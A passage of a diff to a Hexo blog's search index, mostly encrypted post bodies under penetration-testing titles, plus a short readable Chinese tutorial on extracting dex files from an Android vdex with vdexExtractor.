d0e968fafc5ae83f6afbce98caa336333ac078249eab5ce0d634b75e5f81de434081fd8537cb27db0d6d49fa73a8ad3674fe68132351090d884964084f4af177e5fd80300c2d995ef9370b9a66c02e1aa2b44220f8cc147a26b936c3973e0a73718af314203c76e64203c82796bf6b1b06c36c2489b5c021f24fd1a66182bbff9f9493f4d82555eaffd6f649f484a9e1f89cfe30827d84d579c61668a685a2b66b661336dc3a6634b7e7fd7683fccbcf37a73d8226ba8e859319de71bd84f1ef912d0dd0e6dba278864d6cd174ea66f0d9b7bb09d092c92edbd1d6a11fc508e740777f505e2c185dd03d02af2658bcee2a3f0d9e5d26a851ad234613aa3e8f5514aa517d6f11ff7e585ec30b27f1a3f5d5a164555a028b74053bc4d7b176c35af8bb444b98f2abb36f20987d824dc015ce297eb83a53a35679947fb6566a543de74ef0f7b47a6774e943d9cf08c7eb9c6184810eab49ad2b17aa3b19abbc58e5f41df9b1e9a8fb77a43af2822486233d4a9b5d465d50cd78703b9f0552f4fa9720dbb10c5704d2f85db658de63cb8a318340c5b468dfa261cc614df976253491807bee4082bab455cc4cc809df49a710aad6c5fde1a8e7962a968eada0fce42c9742cd4fec93e06eec7f396ec861debb4b4c479a72ba14be71cb68c42cdf91f13e10bd4026ab45ed6367b66717d05347da2f45f3075cd7906195bfc71d1bf65cbccaac188ebf50e4651140a519ab42556f23dc3323e9b702912105419c0f71ed64f90aacff56b27a5d3e2ef5a1c2cd06a5e743dc9425b49bb5e305a79fbd188fd79195cc0052f478724d31bf6f35c2f3f77f7832448eea8b026cd235e0a0a217eabd08f6fb070fc7036af73a31e0cdce756943dc7e3fe3f544d85157cb667417e2bee41ca658df1184d4fcbb13e53c9ded9463c17aa19135ef24b33b4d3325007bf8dcf1c3028e9451628939caa84a9c77f3c7091e93e21a1c6c441142d6027d43d9cea1e6467e53356d29c9914494f5c3a3cb007da4a74a3f07120a0c009e37f8d023124e896c552e808aa2a8729be0655d79be7a5b168288f317d226aad95945f148fcabdb04b6da691c72bd93dba9b0fa16cbae0d0fe3d23dfdffe72f91b4f9d0fa4ca7f24262ff87ae88ca60c8f7d7c6502948e5c7e201dfd3fb291c55df1f7549455eb74c72d7ee581a34cf819a139b565a6d5e1b67a3281e04eb1fef23967ee55af2399df005a8f8f211f5e34f21158594de753bb04927cd13e4f42374b30ba5b3d21540bac96cc64f97420ba5509ae176083a40da4326211c5c2d4c09ac42e26918322836244996f1c93bc72413e45f486b3e6b18c71302a5dfb67eb4225d313e7313810a64d5de7228c4704e5d4f2cea6b44908167ea34c61b22b4b5533803a483b097a4b64b182773043a15eb3fca66830b30686ffe9edd95d8e0a70c3559b91ad7470f3712e7c0df1a7dc9a4ddd0d6bcb01b8e4a01eb6898c519174eef0961588cd5049943ea69d4f29d1b727da58ba51ae367c0aa1f987edf23f9a0458d1c49df39181e6063ad0e41256d1cccbf43e6ffac8d056e7733ef24ed730997a2aed8d1f296aab489131051297e9f45c74ee8cdbe60c2aee7d86f2bf8de33e333691709adea59c14a73eb2e72c139e2cc0d003c7cc282032786c9364d1bbfbb9ff41f2e6889f49105f9413f733275f0a93d08dbd5f41afe9eeeabb8a9a56c77744b913d9b8af0f8f5048eb1a4a9a9e4bcbe6481d22953742bb52a06b6807bd655cb5b9a35532494449cb609c55399eb1803ef7f74962f5e66b23cbfbb67970cfa0df76ec4347c6009771d4a4f14e743d27af723ed353d2ad9f34af1111de0ad601f0d91aa600e2696c458bed02e1a834e41f859ff955d5627e702dc3a400e7ed2fe70b37ab27e40f7ecb08f995feb4803ee3b93dc75e39dd94d2d50b77368458bc154d814f6dd3584b9c07f1f2567e8164d1b97c558492c3615715dea120457bf713c3a96c4e94be625bf38d2c538fb9e96695d50f6aa3eef1059f2cbc783dd770f1218335aef487a35f403f5f9d95bacef5260725b36bf03c1101961a5cb69d737057fc76701d092658585aba78e9035ebfdcbe590994e4151353481d0104673e4eac0a05f4f8b03c9c7ff935b4692e51547b1ac1ae86fa7ec75c43ef66f108bde2607e329b2c75a40813937a9db15d5806594151faca8cca660d750ccc1987b2842fc1a65e1ffe30f25e73cbfa2f588e08460d236dcd19b457b5ab0876c9605c628f405ba31044f4744f6e1911e66e269daf4715e19b265b2440d5d64f512e4a1aedc1cd09002b50ab5e9ebb2d82783331b5c68c5dfffaef003d9574e7e91cfb89000a09690349f82bd94da4f4a7698f793a7ce603230b7948a493d4385514161dd94c868d65bc192b6cf8b5a702ae8ffc9d4e444afe006f58230fdb391d64f5a99b68b44ac19e78fdaf87905692bb2bc1911a0118371c1a46829eca6d8f0d28d9669da352df794c0f2ce79b8fcc6ed5812ef801503660c5bf102e35daa4c640f60fa97c072e5a9b6e6cd80274ea004ca31e60da517da070aa508ef583d766d468edb5bc33a14cbd46e1fe90ed16182b5c9183b78742dc484c207a56bc37f7124fa86ab7a59a624edde37d5fc61a1d493949811b0ba75bf7c16e9c37af47a55172c16686bff247db052e87e86d43c23e670deb0f3ce3841f45ee41504a34d2c43e2f82c8c7d7fd24cdfa5c9249d6e39136c9d98dd9ee27c100ebb781f3b75f5e0e2268071b22972d8098be8858cfcd2923389bc2f60b61e2afb83961e0300a795e332ddcbcfc74500001bf9640d74664c088e93bffe3c967c449319659fa9f6d5fbc089c801745565c70d62a2a73b5f9391b0a901e531f75a8f93e216d70b5fd6858b2fc7a2608c3320bc3ab39cc5a2c04a8e4fce167cc5cbd3de4a9c2b87a8456e4bcf1b14c3a774d783b4d3650bef68da73994893ec64b7c3a2214d451dd3e19078b3cbb1987205976f67ee6055b25020ff6377608fcd7b9b431bf166bb2b0f2463af085f6141330cc60fea3d56113780b7d57175af3558021a159394186d2bc1b4655f8c1b6213c603b387df1361c72a74fd1c0ebe24c4009c026d546ce0e7ac95b1531e5c4b48a7d91649c2e081c192a78b95b379fd42709d68efb0997c01df31dadb8a910548918c2fa4a865c5f69a9b9b1ccbd161fbaf2efcd10c4923996182b5d3603c27463770d67912ec08e25f3c6efcc74b8018f809485f9e6e27e47d93b2f65aac23844a51c3d5e8dcca404b84160fa503d644a2db434f38c923a8bf13e6c5ddeaf662beb983d4b7bf3de911ec7ec324350053ebca56959d5ab6f026b2f667c31cf2083393f1a0ede9648a16340a194839e6507b8be5c865ef55fa8295145a523ba73b5631b351c4f10ce62468f9567239cca35fba839e58784c41bf6718363a325d5a1886a03f365f8b212fe7f818ed9fbb1e499a3d0ce1b55d2db4df4c9c82ef309cd97efb85e9fa485642aa9b3aa6e2f69d679cf4bfdefcd0b0524e0397b0398186c9600417cf294500ba2250f4a1aaf098a80f5af45e27bd0f961b424b09b40ba771f8139546c9d90db048d0578befe4077ec4b85832575e54d3b7c31f59d8f2a42079483bd5a5670c4b38b7ff7370c6f4ac7ba5cebb2248de77e0cf2075c4ac7830a658aead5843ddbe803907c9ffa8780c8c1a568d6850b318084c23c9b92c575db613eecd1d1ed0792c69dd36209d55e82ec51557811e9549fdfcfbf681d2d3ac9b1e35cf63bbe6446308f171782e5bdf856b3e2d39ca2ee3efaac01f508f2570052639b709fcf1252708d66f076915fb1ee5327b98f91facc0a14b3b9b180d040e9dab6bf0f5d91b1e9661e0e90d3e0a3b7e320c805ca185710c30347ef64613bde0c8f66305ecf744390b1e57038d0fb7913a8b386c739e24020b22563f85094d8f1c82f75fc9ad91f8758310cb440ba78fc2818ef9a5fd495eb72a12b2b7874ac281c15160ce90b4020e5456c7a0f48eeafcbce443a4b47aed2bf3a572c8a61ea6bde0631c715e92c821a96279dc19bc6ef4e4d9e2ce8eb2d0a05c0544f94a7050f24133c9985925946d238652a8a85f278f51eb92eba62cb47e3c5cd14f8e880f0f6d2f0023647756ebf4249830ad429e45cdfc70caebbf88a13c590f9bf371f403ad5e78b1a082a7b74da2610d9a8b1f88e697568fecb47cd70225565be51b5e17d0f804463c1e12277553f5a2ebe030708a7a6ba72c46514aa6ae7e928877572a04dfb38d240f9693de15927a4e29b1e3498d14ecbd874ce3abefef66adbc1bdc6e3af7ed06cc4e62a9c6599d63956d9814cd71af9187f663bae67a5307e364861efaea94054e0a56e2595f44d372d79c0cb64752f77fc96de238c46acbcd6a3a9e50d192e68e5aeface495d883c8051b5cf1b241bef450cfeeedc7774652f5920dcf48ce72b3f59e66ec42d76f62ad83bc697c795bf28b53e907b9b066d435059111d50d74f01c49e7f7c275be27f83ff0f0356b070821673a3d15236826d4be12d21a20b26ef6bd14e15c36e71f72ed78694c5132c521bc718da5984ee0db974c17866acc21e893fee61efb8d0701f883ad7f3478358ca94c9130302584667db5ac436d4b94d88141ef6180be3e68867695eee9d20367df41cb93cb75f8c0124cbf28edab2114390b831ed9b69230979ba17a3b6953399ec1394469c2bfeb005cb90d520f7c82239af1ddea91972c4ad497f4c7ccc9df8cab68725e41025ae3748a390cf6aee12fc6b26e7e0720ecda27070c8d6a0517e56ffa96fa7671c2e05d8b15b83db7c7e23e48ea7436f25e61275b7d869ac7aeb869cd735d9e5ea577bd322f88f83b5e6efa9017b4a175b02579d0c3bb5d7c1301efc124520b31afa3e28f7d0d1d824b28f968ccbf4c17f5289ff804a3f474ebf4cff9ee856235013b254ffd8a64d8426f3bb80bdc2f08723904ba931e8a0ff8b6eeff5a74f60d33683f78e629cd7e46c873ce223ec8884c29e45ec320f3e1302e37adcb8f9db664d1ddaef93300cf19dd13042842dc48825a7e4abb36584614a93b4bc1230b27e0f3bcff7d4a6cc00edadcd92455b76e0ec0fa5d51bcff54460e58bf325045ff81d43967c4fdf60719006a5a7bec9ea49f4dd191cc76b6edb20d485316911d3885fb0911f03d84ae11257144bd0f40b150e236265b4f1cb044786fcfffd825b9f7b316e2c3eb9a932b7383757cc58bb9dfc49d805a404a315dfb22b4c346a794ca6fb8b73ef386658ca77f2a5a64be1f6147fab8fd3a7af3deafc17b2f785181b1560c0ffb431525f77cc519ddf5394dc38fd292aec206e599208420d9faa485a7af047084d93035c6780a551bec27fbdd053822523c20430317c9679755411b5c35f59aced2add575e511b413e0e9e5524bb00fbbc75f1cabac5caacfb4e8f4b6418212bf585bebf2642d1e014f79cb0c54fdb0ff6358a4f9958a4cec31e15ea5e0c4029e0b67426ed4aacce6547f7540d5c619899a5e197f2319676ac79ef61f9a279c0b73fecc758f3d7366e602efb4e5aa2a2d428f4e6028bca40c1e7b8e41599bafbac79f921895d3333f673193cc107319f3c53139c22b83a5a547ce72ced3dbd5a72695650601cd75dbbb6ccca2391e99f4280af47cc40fa0fce25efc39fd48ea2b3dd421510600a39c9ae9934b7cd1198d2aaf01c30cf428de82b6efe2d99282666ad37814e8a33b366398d8e5d20e92861186da9f6fd5f0d94229fc660a4220f738fe6c719cc527a1c791849726c86728738cf79f13e1d988cfd46261e28ab968390db0e6da34d07e3e478c0116ebe929b844eacae4ffb99ccd8f0b1aa39148577cf751ebf833cab0b77212c962321d04c779c711b8a20c1c0287136715a2007b60ec47d6ad81da1f16acfcc1422ae4666a56b3698f22bc1acc0b55e6bd46de9da581433a098a01ddaecfa546872d5c43a99ab3d9af53e59b971d477637a9eda7d2906d9d5331e9f635370c7f1678de57289f9bb6729ac9418b45316ddaa7f438bf9cc60b527677b405cc8b1ad32aa4aa85a15f7b0bb029591c88ba4411dabc10115f7a3ca266393bd1e472dfc7195b04bd32d84836b65f9d5ce1d729b5c1518a1cdf10e242a3443d868542794e5e8d5d399430873b337297a3484ceaf1b4c0ba9a7ef3062ac8ec8b1ce85a4f0b4836e93ea697bfc1e86001203063e98fcde7961ec099f3e8b750d09ae1ebe16bd12c709397e82f5e8ce66d1098f26979a076593db3997e2ac72f245cd0877b8abb4abdbc250db3382a146580a74d6b9e97d3840c97781fc05e743ffbf872527d44489b7b180729734716be6857fa88582c6548c5d78610476e7841bbd50c5f3961845b6a14437741512964b6b383bdaea6c36325c40b867c7d3fb402dfc0ec6440f096027ab0747529465ba42fef6b9186d6784eb7f98dd4eefb4c6129cd138eb2a5c74eed79ce2793d59c7e51181ae4eb778fbcf282b70df29e6623e61077bbfe42a1f0f683cd89b0dd14cbddfa154323a3c9f33bc1a3c1a6045d43836dfabfe813504d386563019b49d83a95b0b2d84f994cd2c0baef4d2e97e91a04fd349ab2ee7866cbc988f50d0065e33b3bd4845341b6f05fe80dc72e3be36c7e6d0667cb40b6735c61174acef33175d3b830e0cd520ced6a832f14b0701885ac900d72e8e6c8fb2f0a2bd2f79f671aeeb7141609817ddc2d4627c1d12efa62cd8ad70ea0c0ba02fb46f60f3539d07a259bdfe8ffb88c66ad45a7ba534728be82e8b96b7d22f26c61419235eff1f9625831c33eeb377116c347c63f720379e18b92326f69365cfa82c736216fcdcfae7ffcb1e373615994a87cdc0a17c06660e004f5f6ee2116c1b6ea23757ed331a699b7c6d63bd434a997fc63ba00a660ce08ca7604ec3e67871e00badba08e8cef98813c16eca06cc4d2f5948ae2a09fa1cdd4722190121f0e2f831f446f4efe2c8deec43fa1f810b39685cd5f8b44fdb691160fe48cbb8ef3653342ae6c2f8262ed42bb8ab8a3a640e3142054fde416c72861f33f2d8d4272a2562c3e19b6b9fbb3571d7d92031ff38bf5e1e856e2a7007407a99481f512ffe61a6735db49f0202de607ea54c7413bc5f29c5f0feec49ed27bacbddb8649fc765f6ab499541bec41b8fc59f100c79c0f8429ccfa1eed2ab3862137a148b3a0a382203a55a64fe55f98bc95dc0f3cfb49c84fcc41e8e6a09fd6f6bcd3ef876ab32133054ee5a5e5e1f78fe409e3eba42d7ce800a2e696fe68e8bf6dc772fe56979cc9c07744d63091dc511abf99bb44a909d09d3f44f74cd8f7249a1c9888e0c8c109560a96047c424b0628f73d4f362b0d412712860e6ce8079589e0b9f5c39afb981967aab7e369b836eb5f3367b04d830cd3d728b926aa347268b6b5151f09ed28fc09989c8205b9e14ec5eedd3cc196d8d8d62ff69c04aadad751dd5735bd312af6fc8bb0cb89dc6b6edef12da6f6b998331bfe44d983507edb17830c1fff59df91b6474405158702c86e39b720d48254c5b1dcec53660d8279388104163fede1be0acfa541c04b97aa8d6c6387789b8203bf1f463331df8932a9db345d6f357a20bc7cb3aed466f40c43b1a2dbfa1a22c021214c81b82cbe1bd1db6ce14d0c39fb2473fa29e4d34bbc0fc32efbae4abc1cb32aa8323a2cde62b626f0278abab49ee48c87652f1517a930597fee9053ccd5ee50f2ba7a1958b75eca53b64fb232210d402f3d229c0e24a29b0bcbe29f40b54d41782a9a7c61b65bbbbf41a7421055f1ae347d50dc1dde445090227b7f452131e324dfe83f5c35857ee0a413be85c058b7bdce8379fc95b0dcd3ed3e6b89c6ddff9ffb2524b198bf554d6c20dafbd9c39a612db78f756526b4be936aaee589e2363ea6d2bed47fb714a5293a9e4a05947d1b6a8890f343bd86df14612bfd132f1caec96d9c93d89e8ec726302496fdcfe3c718e3f13ab05117d524dbf2e4e28163141e175bc564dd269bd79933ff6896d3ed44803c486e9517053bc05ecf2c84b185f7ca3e33bd09a593eed742b75837b1b774e47383cd0957940872d4b0e4c07e5123bf79143150669f0428e736c8578f4f6f044d205a5d71c01f218d4de19e3d3bfb8116c7e4f602660589e374479f9ff92d9cc457b8914fa5b6a3b94cb622e452ba9d5001c199f954bd92f22d73a79713d4c620a2fdbcb906e96ba4a085a49faa0a15be05f9a5226dfbfb5cb92bdb4840a6ef04622c39cfce6dbb0633de44e42882470685f0bfb29f92f81f62981bf0c479df7df19109dbe6b029ab2ee96561b7cb6c769a9e3588e07543d789aaa18f4841d4c59af8bccc67b154cd862b77f41a1566ef6d935a8b3d3440e06ae0e400a6e42bc67c7fd7f0cea548e3769253ba3efe7f103a30dbc1302ddfe9a72b8846385e028475829fe84ccda8cd6691c90ce881d9a63bd8659b7383ee4479fe9a38c3fc47db76bcf083fb5d3e84d3868b6888f1db351b1af517d790be5a33ee94abeb01062c875ff4564123f8a629233c902365cf61a64b28c9b652485e0b3caf2316ab058ae7135e2769241e87412b7b5c806bd5ae4ef2449c8b3528af7cec63feb6cb7fd29fb90277fcc41c0039f8e79dbdaae1f90362c582fdb98b49ca1eca615cc4a80c54ad917bc05f043ad46e8982e3c4c77de32dcd613d1dd493775e92b3596979bef5454fee7d9905e16b93667be2f451bf00b3888e8b3636774c466bf3df3429e9f5fde93b283381d2ecbab2923fd86fcf2cb6b20d90517c6a668501592145f5cf7c425d151c63ae815c42236cdceed56a140a576cd2c1f4110d149b4c0762dc827658e9ae3fdddbf4a5b95acf9ffd52984236bd6df58c5bbaf14ffd082b94390cc98fec3ac96c08f2637b86bfd818f2f3fc796eb1ec1ed59a0927d7af529c1e4eb42b929eb93732d2855f9f13a032dcb9ce830c480d7f3e9d3f28dea87b9a43ed91363c42832627dd68da167631edbd609cd2d4cfde1e23a28928c4a6f0841ac986a5cf14f642c34a550bc3ca199cf08c578b2b8359c3fa94988f70534079e349bb74c762d89ccd83ec91d4c3de8c4fcdfe140eac5ee8553d5d04e1f77f85ec4c50e48b7bfe255b969a16e9dd7dc16b8f072a73e8f24c588bae031540e11d2e3c462d798af5b65bd1f79a87b4f073d95720e9c6688798526f9cef7a59d0832f54369c0c3e3372bcd7c86affbf761164c6bf1ab8e34da7864eacbc2bb6c8ec95ffaa233251349cda1216db0fa847fdb53e2a02ab4c951ebc10f0ebd1c42e5c780b9af1419bb69fc3ed71eef30d17f42ea8ea5746ae0b56eb1e189034d42bc589b2290d314c2659cdd9dce2e72f5bf8dc4d5e605a82609730e281ab725dd0bbc26b437197ae53db194271c5ccad4b79376250a95fba938dd2d7a5d194ba</script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+    <title>使用vdexExtractor将vdex文件转为dex</title>
+    <url>/posts/1d39133b.html</url>
+    <content><![CDATA[<h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>使用的系统版本ubuntu14.04</p>
+<a id="more"></a>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/anestisb/vdexExtractor</span><br><span class="line"><span class="built_in">cd</span> vdexExtractor</span><br><span class="line">bash make.sh</span><br></pre></td></tr></table></figure>
+
+<p>这时会在bin/下生成可执行文件vdexExtractor<br><img src="/posts/1d39133b/360%E6%88%AA%E5%9B%BE-6499875.png" alt="360截图-6499875.png"></p>
+<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>接下来新建两个文件夹分别存放vdex文件和将要生成的dex文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir vdex</span><br><span class="line">mkdir dex</span><br><span class="line">mv NBGalleryLockScreen_classes.vdex vdex</span><br><span class="line">./vdexExtractor -i vdex -o dex</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/posts/1d39133b/360%E6%88%AA%E5%9B%BE-6648140.png" alt="360截图-6648140.png"></p>
+<h2 id="一些注意"><a href="#一些注意" class="headerlink" title="一些注意"></a>一些注意</h2><p>我这次是对nubia z18(Android 8.1)中的锁屏画报进行提取<br>最后会在dex文件夹下生成NBGalleryLockScreen_classes.dex文件<br><img src="/posts/1d39133b/360%E6%88%AA%E5%9B%BE-6893750.png" alt="360截图-6893750.png"></p>
+<p>所有文件打包<br>链接: <a href="https://pan.baidu.com/s/1bLtSZKUxN-jgF4LyYD6zow">https://pan.baidu.com/s/1bLtSZKUxN-jgF4LyYD6zow</a> 提取码: 774b </p>
+]]></content>
       <categories>
-        <category>内网渗透</category>
+        <category>Android</category>
       </categories>
       <tags>
-        <tag>内网渗透</tag>
-        <tag>渗透测试</tag>
+        <tag>Android</tag>
+        <tag>Reverse</tag>
       </tags>
   </entry>
   <entry>
@@ -1123,31 +1128,6 @@
       </tags>
   </entry>
   <entry>
-    <title>使用vdexExtractor将vdex文件转为dex</title>
-    <url>/posts/1d39133b.html</url>
-    <content><![CDATA[<h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>使用的系统版本ubuntu14.04</p>
-<a id="more"></a>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/anestisb/vdexExtractor</span><br><span class="line"><span class="built_in">cd</span> vdexExtractor</span><br><span class="line">bash make.sh</span><br></pre></td></tr></table></figure>
-
-<p>这时会在bin/下生成可执行文件vdexExtractor<br><img src="/posts/1d39133b/360%E6%88%AA%E5%9B%BE-6499875.png" alt="360截图-6499875.png"></p>
-<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>接下来新建两个文件夹分别存放vdex文件和将要生成的dex文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir vdex</span><br><span class="line">mkdir dex</span><br><span class="line">mv NBGalleryLockScreen_classes.vdex vdex</span><br><span class="line">./vdexExtractor -i vdex -o dex</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="/posts/1d39133b/360%E6%88%AA%E5%9B%BE-6648140.png" alt="360截图-6648140.png"></p>
-<h2 id="一些注意"><a href="#一些注意" class="headerlink" title="一些注意"></a>一些注意</h2><p>我这次是对nubia z18(Android 8.1)中的锁屏画报进行提取<br>最后会在dex文件夹下生成NBGalleryLockScreen_classes.dex文件<br><img src="/posts/1d39133b/360%E6%88%AA%E5%9B%BE-6893750.png" alt="360截图-6893750.png"></p>
-<p>所有文件打包<br>链接: <a href="https://pan.baidu.com/s/1bLtSZKUxN-jgF4LyYD6zow">https://pan.baidu.com/s/1bLtSZKUxN-jgF4LyYD6zow</a> 提取码: 774b </p>
-]]></content>
-      <categories>
-        <category>Android</category>
-      </categories>
-      <tags>
-        <tag>Android</tag>
-        <tag>Reverse</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>内网渗透之端口转发、内网代理</title>
     <url>/posts/a32cfbcf.html</url>
     <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -1166,6 +1146,26 @@
       <tags>
         <tag>内网渗透</tag>
         <tag>端口转发</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网渗透常用CMD命令总结</title>
+    <url>/posts/c2f7796a.html</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">Hey, password is required here.</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="1e6ae85d26a7b1ba0846f4d281802c21a7083e57866c498311095856c488768b">6ee5c19fccb06a6ea3cf3d35c8ba75962695edc8ce5b780ba41055a63a5655af35e31ffbb57bea3046a8f7287d10e9db2139fa746917875d9fe75b9176ab646282621b136c4efe9024f56b69498cd79939b4ca2cd24174893bbff208a2fed06940bbc84db8ef18ac6c75b8114eb11b22ab599a93cc6bef358bfc1a36a10308abafe36eaebfb82246bcfc2a17c8dc618f07f32cde730d6624c9ea72d819855fa0244dfa92afc5fbe06e3ee6025d3f1c792bfdb859ba9c0595578a9e41884ad15f43bebce80734b1db7dcefe1966876fab2154ec8a9b94482fe3c563c83b3aab017da2f4fcd2c6dcbf2930d4c1a8ad0be6a3e56997417c3487d675ad7e75be70d199f20bc800fc14b7f1a6631e7ada7e13128fa6d46c0d80fdbc2a8562686ef3df30e2ba1cf3babe82ea2f6948d70300d57cb1af971f62ec7314363f299270ea65ba2f52e7f8e010adcd79d1575418f2b702534fed9e1608b59bca935e7b1911a9ced6a9b4d342a250b597557206e7105d9b265b65f2c4cdf28c1995a4d3e2fe9e53165278ff1124c832b75ce856a706b13ff589aa9de3121d05aa68de4bf550edfba687a9173e86a7e94ff417c2458dd078e899f3e52b0901163327db8e9ee4059a21d7ccbacb91f254cf7d9a2a8803d5cf0c5fb237f118993511921f1fbcf48c41eb6d7a45ceadbb61a5374b7659b3ef92256addf30e577821e2e6251b6b8c1fda40f363ae91ffca3c16be9ccd69916c35755bf2e5081d423c3c94e9e9a4e3288ffdd08ce7378fcee6128a064a2970eaeed2e5972710201753ed504fc20810f024cc94d0a57962c879d333910efd61d6d59e57854ea95644fa91e96c5ca4f643c76f3f6bd868daad445c54e9222334948cd3ba8ddb66d5e3ec1ba633c08e876adc61a883cf5064552a1bd9c2188ca58f50c79ef9123d0e8f0130edaa18ef6bf975c15b00a849c1f03a4cd0fd929f8b0deec949d143dc5bc45ab98b442ddbdc942b9b9e53a09370e12e15f6af0f514326f201e0d8002165c4126dc9d22dae126c74ffc7b9da175da5f31b6b7a8ee44550bbb917136e95c42cdf9f6e5444084771da265ee337054474c3fb447020e3c96de196e78350ec9ce497dda8bf8aa24134112769566316ea499215ff28845b1de2e6431d41ee9778bfaf3fe278ce9f25de44e1b47dccca53b3a745b6c856dcc3335bdeab72077c2c32f30dcd2b41fdbc800007e663d5f20beac80c72b58f322628bb64b26fc5226eb4b984b41b93ec472e56b32852dbc3715330f778fdf7a4f99cbbe64643ad0d2ead51926606f0d51ce66b5fc1c0d7c95eeb20fbecbbdd83d4b744f6a3301c0c94f7bd028e59cbd0404a2db7b50c4da9d0e968fafc5ae83f6afbce98caa336333ac078249eab5ce0d634b75e5f81de434081fd8537cb27db0d6d49fa73a8ad3674fe68132351090d884964084f4af177e5fd80300c2d995ef9370b9a66c02e1aa2b44220f8cc147a26b936c3973e0a73718af314203c76e64203c82796bf6b1b06c36c2489b5c021f24fd1a66182bbff9f9493f4d82555eaffd6f649f484a9e1f89cfe30827d84d579c61668a685a2b66b661336dc3a6634b7e7fd7683fccbcf37a73d8226ba8e859319de71bd84f1ef912d0dd0e6dba278864d6cd174ea66f0d9b7bb09d092c92edbd1d6a11fc508e740777f505e2c185dd03d02af2658bcee2a3f0d9e5d26a851ad234613aa3e8f5514aa517d6f11ff7e585ec30b27f1a3f5d5a164555a028b74053bc4d7b176c35af8bb444b98f2abb36f20987d824dc015ce297eb83a53a35679947fb6566a543de74ef0f7b47a6774e943d9cf08c7eb9c6184810eab49ad2b17aa3b19abbc58e5f41df9b1e9a8fb77a43af2822486233d4a9b5d465d50cd78703b9f0552f4fa9720dbb10c5704d2f85db658de63cb8a318340c5b468dfa261cc614df976253491807bee4082bab455cc4cc809df49a710aad6c5fde1a8e7962a968eada0fce42c9742cd4fec93e06eec7f396ec861debb4b4c479a72ba14be71cb68c42cdf91f13e10bd4026ab45ed6367b66717d05347da2f45f3075cd7906195bfc71d1bf65cbccaac188ebf50e4651140a519ab42556f23dc3323e9b702912105419c0f71ed64f90aacff56b27a5d3e2ef5a1c2cd06a5e743dc9425b49bb5e305a79fbd188fd79195cc0052f478724d31bf6f35c2f3f77f7832448eea8b026cd235e0a0a217eabd08f6fb070fc7036af73a31e0cdce756943dc7e3fe3f544d85157cb667417e2bee41ca658df1184d4fcbb13e53c9ded9463c17aa19135ef24b33b4d3325007bf8dcf1c3028e9451628939caa84a9c77f3c7091e93e21a1c6c441142d6027d43d9cea1e6467e53356d29c9914494f5c3a3cb007da4a74a3f07120a0c009e37f8d023124e896c552e808aa2a8729be0655d79be7a5b168288f317d226aad95945f148fcabdb04b6da691c72bd93dba9b0fa16cbae0d0fe3d23dfdffe72f91b4f9d0fa4ca7f24262ff87ae88ca60c8f7d7c6502948e5c7e201dfd3fb291c55df1f7549455eb74c72d7ee581a34cf819a139b565a6d5e1b67a3281e04eb1fef23967ee55af2399df005a8f8f211f5e34f21158594de753bb04927cd13e4f42374b30ba5b3d21540bac96cc64f97420ba5509ae176083a40da4326211c5c2d4c09ac42e26918322836244996f1c93bc72413e45f486b3e6b18c71302a5dfb67eb4225d313e7313810a64d5de7228c4704e5d4f2cea6b44908167ea34c61b22b4b5533803a483b097a4b64b182773043a15eb3fca66830b30686ffe9edd95d8e0a70c3559b91ad7470f3712e7c0df1a7dc9a4ddd0d6bcb01b8e4a01eb6898c519174eef0961588cd5049943ea69d4f29d1b727da58ba51ae367c0aa1f987edf23f9a0458d1c49df39181e6063ad0e41256d1cccbf43e6ffac8d056e7733ef24ed730997a2aed8d1f296aab489131051297e9f45c74ee8cdbe60c2aee7d86f2bf8de33e333691709adea59c14a73eb2e72c139e2cc0d003c7cc282032786c9364d1bbfbb9ff41f2e6889f49105f9413f733275f0a93d08dbd5f41afe9eeeabb8a9a56c77744b913d9b8af0f8f5048eb1a4a9a9e4bcbe6481d22953742bb52a06b6807bd655cb5b9a35532494449cb609c55399eb1803ef7f74962f5e66b23cbfbb67970cfa0df76ec4347c6009771d4a4f14e743d27af723ed353d2ad9f34af1111de0ad601f0d91aa600e2696c458bed02e1a834e41f859ff955d5627e702dc3a400e7ed2fe70b37ab27e40f7ecb08f995feb4803ee3b93dc75e39dd94d2d50b77368458bc154d814f6dd3584b9c07f1f2567e8164d1b97c558492c3615715dea120457bf713c3a96c4e94be625bf38d2c538fb9e96695d50f6aa3eef1059f2cbc783dd770f1218335aef487a35f403f5f9d95bacef5260725b36bf03c1101961a5cb69d737057fc76701d092658585aba78e9035ebfdcbe590994e4151353481d0104673e4eac0a05f4f8b03c9c7ff935b4692e51547b1ac1ae86fa7ec75c43ef66f108bde2607e329b2c75a40813937a9db15d5806594151faca8cca660d750ccc1987b2842fc1a65e1ffe30f25e73cbfa2f588e08460d236dcd19b457b5ab0876c9605c628f405ba31044f4744f6e1911e66e269daf4715e19b265b2440d5d64f512e4a1aedc1cd09002b50ab5e9ebb2d82783331b5c68c5dfffaef003d9574e7e91cfb89000a09690349f82bd94da4f4a7698f793a7ce603230b7948a493d4385514161dd94c868d65bc192b6cf8b5a702ae8ffc9d4e444afe006f58230fdb391d64f5a99b68b44ac19e78fdaf87905692bb2bc1911a0118371c1a46829eca6d8f0d28d9669da352df794c0f2ce79b8fcc6ed5812ef801503660c5bf102e35daa4c640f60fa97c072e5a9b6